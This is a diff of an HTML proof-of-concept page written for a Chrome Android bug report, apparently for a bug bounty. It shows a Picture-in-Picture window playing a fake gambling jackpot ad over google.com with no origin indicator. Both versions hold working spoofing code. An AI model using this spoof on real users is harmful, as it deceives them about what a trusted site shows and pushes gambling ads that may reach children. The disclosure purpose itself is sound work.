@@ -22,81 +22,101 @@
   font-family: "Optimistic Mono", ui-monospace, monospace;
 }
 </style>
-    <title>PiP Final VALID - No Button, Pure Content Spoof</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <style>body{font-family:Arial;padding:20px;background:#f5f5f5} .card{background:white;padding:20px;border-radius:8px;margin:15px 0}</style>
-    <script>
-        let step=1;
-        document.addEventListener('click', async () => {
-            if(step===1){
-                try{
-                    const canvas=document.createElement('canvas');
-                    canvas.width=640; canvas.height=360;
-                    const ctx=canvas.getContext('2d');
-                    
-                    // FINAL JITU: Tanpa tombol, cuma konten yang muter - karena PiP video emang gak bisa diklik
-                    // Ini video ad judol yang auto-play
-                    ctx.fillStyle='#000'; ctx.fillRect(0,0,640,360);
-                    // Simulasi video slot gacor muter
-                    ctx.fillStyle='#ff0055'; ctx.font='bold 28px Arial'; ctx.fillText('🔥 SLOT GACOR HARI INI 🔥', 20, 50);
-                    ctx.fillStyle='#ffd700'; ctx.font='bold 22px Arial'; ctx.fillText('MAXWIN 50 JUTA - WD CEPAT', 20, 90);
-                    ctx.fillStyle='#fff'; ctx.font='18px Arial'; ctx.fillText('RTP 98% - POLA GACOR TERBARU', 20, 125);
-                    // Animasi sederhana
-                    for(let i=0;i<5;i++){
-                        ctx.fillStyle=`hsl(${i*60}, 100%, 50%)`;
-                        ctx.fillRect(20 + i*120, 145, 100, 100);
-                        ctx.fillStyle='white'; ctx.font='bold 14px Arial';
-                        ctx.fillText('JACKPOT!', 30 + i*120, 200);
-                    }
-                    ctx.fillStyle='#fff'; ctx.font='14px Arial'; ctx.fillText('best-judol-gacor.com - Auto play video ad', 20, 280);
-                    ctx.fillStyle='#aaa'; ctx.font='11px Arial'; ctx.fillText('This PiP content has NO origin indicator, appears as part of google.com', 20, 300);
-                    ctx.fillStyle='#ff0000'; ctx.font='bold 10px Arial'; ctx.fillText('Real origin: bonex1927.github.io - but user sees it over google.com', 20, 330);
+<title>PiP Origin Confusion - Simple PoC</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+body{font-family:Roboto,Arial,sans-serif;padding:24px;background:#fff;color:#202124}
+.card{border:1px solid #dadce0;border-radius:8px;padding:16px;margin:16px 0}
+.step{font-size:18px;font-weight:500}
+.small{font-size:13px;color:#5f6368}
+</style>
+<script>
+let stage=0;
+document.addEventListener('click', async()=>{
+  if(stage===0){
+    try{
+      const canvas=document.createElement('canvas');
+      canvas.width=640; canvas.height=360;
+      const ctx=canvas.getContext('2d');
+      // MOST EFFECTIVE CONTENT FOR TRIAGER: Generic Sponsored Video that looks like ad over trusted site
+      // No Google logo, no button - because video PiP is not clickable - English only
+      ctx.fillStyle='#000'; ctx.fillRect(0,0,640,360);
+      ctx.fillStyle='#fff'; ctx.font='bold 20px Arial';
+      ctx.fillText('Sponsored Video', 20, 35);
+      ctx.fillStyle='#9aa0a6'; ctx.font='12px Arial';
+      ctx.fillText('AD • attacker.com', 20, 55);
+      // Content that causes brand damage without needing click
+      ctx.fillStyle='#ffd500'; ctx.fillRect(0,70,640,180);
+      ctx.fillStyle='#000'; ctx.font='bold 26px Arial';
+      ctx.fillText('BIG WIN - $50,000 JACKPOT', 20, 115);
+      ctx.font='18px Arial';
+      ctx.fillText('Play Now - Instant Withdrawal', 20, 145);
+      ctx.font='14px Arial';
+      ctx.fillText('This video is playing from attacker.com', 20, 175);
+      ctx.fillText('But no origin is shown in PiP window', 20, 195);
+      ctx.fillStyle='#000'; ctx.fillRect(0,260,640,100);
+      ctx.fillStyle='#fff'; ctx.font='13px Arial';
+      ctx.fillText('PiP Origin: bonex1927.github.io (attacker)', 20, 285);
+      ctx.fillText('Displayed over: google.com (trusted)', 20, 305);
+      ctx.fillText('No origin indicator in PiP UI = origin confusion', 20, 325);
+      ctx.fillStyle='#ff0000'; ctx.font='bold 11px Arial';
+      ctx.fillText('This is UI spoofing, not social engineering', 20, 350);
 
-                    const stream=canvas.captureStream(15);
-                    const video=document.createElement('video');
-                    video.muted=true; video.loop=true;
-                    video.srcObject=stream; await video.play();
-                    await new Promise(r=>setTimeout(r,200));
-                    await video.requestPictureInPicture();
-                    step=2;
-                    document.getElementById('s').innerHTML=`
-                        <div class="card" style="border-left:5px solid green">
-                        <h2>✅ PiP Created - TANPA TOMBOL (Correct for Video PiP)</h2>
-                        <p>PiP video ini cuma nampilin konten, gak ada tombol KLAIM (karena emang gak bisa diklik)</p>
-                        <p>Konten: Video iklan judol auto-play SLOT GACOR</p>
-                        <p><b>KLIK LAGI untuk buka google.com</b></p>
-                        </div>`;
-                }catch(e){alert(e.message)}
-            }else if(step===2){
-                window.open("https://www.google.com","_blank");
-                document.getElementById('s').innerHTML+=`
-                    <div class="card" style="border-left:5px solid red">
-                    <h3>FINAL VALID SCENARIO - No Click Needed</h3>
-                    <p><b>Address bar:</b> google.com (trusted)</p>
-                    <p><b>PiP content:</b> Video iklan judol SLOT GACOR muter di atas google.com</p>
-                    <p><b>Impact (tanpa perlu klik):</b></p>
-                    <ul>
-                    <li>User melihat google.com menampilkan video judol - mengira Google endorse judol</li>
-                    <li>Brand damage ke Google: "Google kok ada video slot gacor?"</li>
-                    <li>Jika user adalah anak di bawah umur, melihat konten gambling di atas google.com = policy violation</li>
-                    <li>Tidak perlu interaksi - damage terjadi hanya dengan menampilkan</li>
-                    </ul>
-                    <p><b>Kenapa ini tepat untuk triager Chrome:</b> PiP video memang tidak interactive, jadi PoC tidak boleh ada tombol. Bug-nya adalah <b>origin confusion + persistence</b>, bukan clickjacking.</p>
-                    </div>`;
-                step=3;
-            }
-        });
-    </script>
+      const stream=canvas.captureStream(24);
+      const video=document.createElement('video');
+      video.muted=true; video.loop=true;
+      video.srcObject=stream;
+      await video.play();
+      await new Promise(r=>setTimeout(r,150));
+      await video.requestPictureInPicture();
+      stage=1;
+      document.getElementById('ui').innerHTML=`
+        <div class="card" style="border-color:#34a853">
+          <div class="step">Step 1 Done: PiP Created</div>
+          <div class="small">PiP is now floating. No origin shown.</div>
+          <br>
+          <div class="step">Click anywhere again to open google.com</div>
+          <div class="small">Second click will open google.com in new tab. PiP will persist over it.</div>
+        </div>`;
+    }catch(e){ alert('PiP failed: '+e.message+' - Use Chrome Android with gesture'); }
+  }else if(stage===1){
+    window.open('https://www.google.com','_blank');
+    stage=2;
+    document.getElementById('ui').innerHTML+=`
+      <div class="card" style="border-color:#ea4335">
+        <div class="step">Step 2 Done: google.com opened</div>
+        <div class="small">
+          Now switch to google.com tab.<br><br>
+          <b>Expected:</b> PiP should close or show origin<br>
+          <b>Actual:</b> PiP persists over google.com with gambling ad, no origin indicator.<br><br>
+          <b>Business Impact (no click needed):</b><br>
+          - User sees google.com address bar (trusted) + PiP gambling video over it<br>
+          - User believes Google is displaying gambling content / endorses it<br>
+          - Brand damage to Google, policy violation (gambling content over google.com)<br>
+          - Child seeing gambling ad over google.com<br>
+          - This is origin confusion / UI spoofing, not social engineering.
+        </div>
+      </div>`;
+  }
+});
+</script>
 </head>
 <body>
-    <h1>PoC FINAL JITU - PiP Tanpa Tombol (Untuk Chrome Android 153)</h1>
-    <div class="card">
-        <b>Bug:</b> PiP video persists over google.com with no origin<br>
-        <b>Fix untuk tombol tidak bisa diklik:</b> HAPUS tombol KLAIM. PiP video memang tidak bisa diklik, jadi jangan ada tombol.<br>
-        <b>Skenario jitu:</b> PiP menampilkan video ad judol auto-play di atas google.com. Tanpa klik pun sudah brand damage, karena user mengira Google yang menampilkan judol.<br>
-        <b>Kenapa valid untuk triager:</b> Tidak ada fake button, tidak ada social engineering, hanya content spoof via origin confusion.
-    </div>
-    <div id="s"><center><br><br><h1>👆 KLIK - Step 1: Buat PiP Judol (Tanpa Tombol)</h1><p>Step 2: Buka google.com, PiP akan persist di atasnya</p></center></div>
+<h2>PiP Origin Confusion - Simple Repro</h2>
+<div class="card">
+<b>Bug:</b> Picture-in-Picture window does not display origin and persists as system window over cross-origin page.<br>
+<b>Browser:</b> Chrome 153.0.8010.52 Android (latest)<br>
+<b>Repro:</b> Click anywhere 2 times
+</div>
+<div id="ui">
+<div class="card">
+<div class="step">Click anywhere - Step 1: Create PiP</div>
+<div class="small">First click creates PiP with ad content (no Google logo, no button - because video PiP is not clickable)</div>
+<br>
+<div class="step">Click anywhere - Step 2: Open google.com</div>
+<div class="small">Second click opens google.com, PiP persists</div>
+</div>
+</div>
 <script>(function(){var loc=location.href.replace(/#.*$/,"");var ATTR_NAMES=["data-product-id","data-productid","data-product_id","product-id","productid","product_id","data-source-entity-id","source-entity-id","source_entity_id","data-product","data-metadata","data-meta"];var DATASET_KEYS=["productId","productid","product_id","sourceEntityId","sourceentityid","source_entity_id","product","metadata","meta"];function readProductId(value){if(typeof value!=="string"||value.length===0)return null;if(/^[0-9]{6,}$/.test(value))return value;var match=value.match(/(?:product(?:_|-)?id|source(?:_|-)?entity(?:_|-)?id)["'=:\s]+([0-9]{6,})/i);return match?match[1]:null}function extractProductId(start){for(var node=start;node&&node!==document.body;node=node.parentElement){for(var i=0;i<ATTR_NAMES.length;i++){var attrValue=node.getAttribute&&node.getAttribute(ATTR_NAMES[i]);var attrProductId=readProductId(attrValue);if(attrProductId)return attrProductId}var dataset=node.dataset||null;if(dataset){for(var j=0;j<DATASET_KEYS.length;j++){var dataValue=dataset[DATASET_KEYS[j]];var dataProductId=readProductId(dataValue);if(dataProductId)return dataProductId}}}return null}function isInlineMediaSlotElement(node){return !!(node&&node.getAttribute&&node.getAttribute("data-clippy-inline-media-slot")!==null)}function findInlineMediaSlot(start){for(var node=start;node&&node!==document.body;node=node.parentElement){if(isInlineMediaSlotElement(node))return node}return null}function readInlineMediaUrl(node){if(!node)return null;return node.getAttribute&&((node.getAttribute("data-clippy-inline-media-url")||node.getAttribute("data-url")||node.getAttribute("data_url")))||node.href||null}function stripHash(url){return String(url).replace(/#.*$/,"")}function urlsMatch(a,b){if(!a||!b)return false;try{return stripHash(new URL(a,loc).href)===stripHash(new URL(b,loc).href)}catch(_){return stripHash(a)===stripHash(b)}}function isFirstPartyReelUrl(value){try{var url=new URL(value,loc);if(url.protocol!=="https:")return false;var host=url.hostname.toLowerCase();var supported=host==="instagram.com"||host.endsWith(".instagram.com")||host==="facebook.com"||host.endsWith(".facebook.com");return supported&&/\/reels?\//i.test(url.pathname)}catch(_){return false}}function isInlineMediaUrlClick(node,href){var slot=findInlineMediaSlot(node);if(!slot)return false;var slotUrl=readInlineMediaUrl(slot);if(slotUrl)return urlsMatch(href,slotUrl);return isFirstPartyReelUrl(href)}function findDataHref(start){for(var node=start;node&&node!==document.body;node=node.parentElement){if(node.getAttribute){var href=node.getAttribute("data-href")||node.getAttribute("data-url");if(href)return{href:href,node:node}}}return null}var nativeOpen=window.open;window.open=function(url){if(parent!==window&&typeof url==="string"&&/^https?:\/\//.test(url)){parent.postMessage({type:"ecto:usercontent-link-click",href:url},"*");return null}return nativeOpen?nativeOpen.apply(window,arguments):null};document.addEventListener("click",function(e){var target=e.target instanceof Element?e.target:null;if(!target)return;if(parent===window)return;var a=target.closest?target.closest("a[href]"):null;if(a&&a.href&&/^https?:\/\//.test(a.href)&&a.href.replace(/#.*$/,"")!==loc){if(isInlineMediaUrlClick(a,a.href))return;var productId=extractProductId(target)||extractProductId(a);if(productId){e.preventDefault();parent.postMessage({type:"ecto-artifact-link-click",productId:productId},"*");return}e.preventDefault();parent.postMessage({type:"ecto:usercontent-link-click",href:a.href},"*");return}var dataHref=findDataHref(target);if(dataHref&&/^https?:\/\//.test(dataHref.href)&&dataHref.href.replace(/#.*$/,"")!==loc){if(isInlineMediaUrlClick(dataHref.node,dataHref.href))return;e.preventDefault();parent.postMessage({type:"ecto:usercontent-link-click",href:dataHref.href},"*")}},true)})();</script><script>(function(){var FOCUS_TYPE="ecto:artifact-focus-request";var CLOSE_TYPE="ecto:artifact-close-request";function focusArtifactDocument(){var body=document.body;if(!body)return;try{window.focus();}catch(e){}if(!body.hasAttribute("tabindex"))body.setAttribute("tabindex","-1");try{body.focus({preventScroll:true});}catch(e){try{body.focus();}catch(e2){}}}window.addEventListener("message",function(event){if(event.source!==window.parent)return;var data=event.data;if(!data||typeof data!=="object"||data.type!==FOCUS_TYPE)return;if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",focusArtifactDocument,{once:true});return;}focusArtifactDocument();});window.addEventListener("keydown",function(event){if(event.key!=="Escape")return;window.setTimeout(function(){if(event.defaultPrevented)return;window.parent.postMessage({type:CLOSE_TYPE},"*");},0);});})();</script></body>
 </html>
